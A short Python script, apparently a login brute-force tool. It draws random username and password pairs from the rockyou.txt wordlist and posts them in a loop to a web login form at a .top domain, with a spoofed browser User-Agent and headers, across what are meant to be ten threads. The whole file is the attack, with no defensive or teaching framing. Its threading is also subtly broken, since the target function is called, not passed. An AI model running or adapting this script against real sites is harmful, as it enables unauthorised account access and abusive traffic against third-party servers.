import requests
import random
from threading import Thread

with open("D:\\rockyou.txt") as f:
    wordstr = f.read()
wordlist = wordstr.split('\n')
url = 'http://aaaa.aaaaaaaa.top/'
headers = {
    'Host': 'aaaa.aaaaaaaa.top',
    'Origin': 'http://aaaa.aaaaaaaa.top',
    'Referer': 'http://aaaa.aaaaaaaa.top/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'}
form_data = {"user":"as","pass":"asgfsa"}

def rockyou():
    global wordlist
    global url
    global headers
    global form_data
    for i in range(100000):
        try:
            user = random.choice(wordlist)
            pass_ = random.choice(wordlist)
            form_data["user"] = user
            form_data["pass"] = pass_
            response = requests.post(url, data=form_data, headers=headers)
            print(user)
            # print(pass_)
            print(response.status_code)
        except Exception as e:
            print(e)


if __name__ == '__main__':
    threadList = []
    for i in range(10):
        t = Thread(target=rockyou(), args=())
        t.start()
        threadList.append(t)

    for t in threadList:
        t.join()